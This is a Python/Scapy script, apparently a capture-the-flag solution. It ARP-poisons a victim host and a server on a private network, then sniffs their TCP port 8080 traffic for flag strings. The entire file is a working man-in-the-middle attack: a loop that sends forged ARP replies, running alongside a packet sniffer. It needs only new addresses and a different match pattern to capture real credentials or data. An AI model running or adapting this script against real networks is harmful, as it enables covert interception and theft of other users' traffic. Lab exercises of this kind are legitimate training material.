from scapy.all import *
import threading

conf.debug_match = 0     
conf.debug_dissector = 0 
conf.verb = 0            

VICTIM_IP = "10.10.0.20"
SERVER_IP = "10.10.0.30"

VICTIM_MAC = "00:00:00:00:00:20"
SERVER_MAC = "00:00:00:00:00:30"

def arp_poison(victim_ip, victim_mac, server_ip, server_mac):
    # Create ARP packets for poisoning
    arp_to_victim = (
        Ether(dst=victim_mac) / 
        ARP(
            op=2, 
            pdst=victim_ip, 
            psrc=server_ip, 
            hwsrc=get_if_hwaddr("eth0"),
            hwdst=victim_mac
        )
    )
    
    arp_to_server = (
        Ether(dst=server_mac) / 
        ARP(
            op=2, 
            pdst=server_ip, 
            psrc=victim_ip, 
            hwsrc=get_if_hwaddr("eth0"),
            hwdst=server_mac
        )
    )

    # Send the ARP packets in a loop
    while True:
        sendp(arp_to_victim)
        sendp(arp_to_server)
        time.sleep(2)  # Wait for 2 seconds before sending again

def packet_callback(packet):
    if packet.haslayer(Raw):
        data = packet[Raw].load.decode(errors="ignore")

        match = re.search(r"FLAG\{[^}]+\}", data)

        if match:
            print(f"\n[🔥 FLAG] {match.group(0)}\n")


if __name__ == "__main__":
    try:
        print("Starting ARP poisoning...")
        threading.Thread(
            target=lambda: arp_poison(VICTIM_IP, VICTIM_MAC, SERVER_IP, SERVER_MAC),
            daemon=True
        ).start()


        sniff(
            iface="eth0",
            filter="tcp port 8080",
            prn=packet_callback,
            store=False
        )
    except KeyboardInterrupt:
        print("ARP poisoning stopped.")